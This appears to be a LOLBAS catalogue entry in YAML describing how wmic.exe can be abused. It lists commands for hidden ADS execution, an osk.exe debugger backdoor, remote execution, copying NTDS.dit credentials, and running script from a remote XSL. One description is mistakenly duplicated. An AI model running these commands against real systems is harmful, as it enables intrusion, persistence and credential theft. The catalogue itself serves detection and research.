---
Name: Wmic.exe
Description: The WMI command-line (WMIC) utility provides a command-line interface for WMI
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: wmic.exe process call create "c:\ads\file.txt:program.exe"
    Description: Execute a .EXE file stored as an Alternate Data Stream (ADS)
    Usecase: Execute binary file hidden in Alternate data streams to evade defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process call create calc
    Description: Execute calc from wmic
    Usecase: Execute binary from wmic to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
    Description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.
    Usecase: Execute binary by manipulate the debugger for a program to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
    Description: Execute evil.exe on the remote system.
    Usecase: Execute binary on a remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
    Description: Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.
    Usecase: Execute binary with scheduled task created with wmic on a remote computer
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
    Description: Create a volume shadow copy of NTDS.dit that can be copied.
    Usecase: Execute binary on remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
    Description: Create a volume shadow copy of NTDS.dit that can be copied.
    Usecase: Execute binary on remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
    Description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
    Usecase: Execute script from remote system
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\wbem\wmic.exe
  - Path: C:\Windows\SysWOW64\wbem\wmic.exe
Code_Sample:
  - Code:
Detection:
  - IOC: Wmic getting scripts from remote system
Resources:
  - Link: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
  - Link: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - Link: https://twitter.com/subTee/status/986234811944648707
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
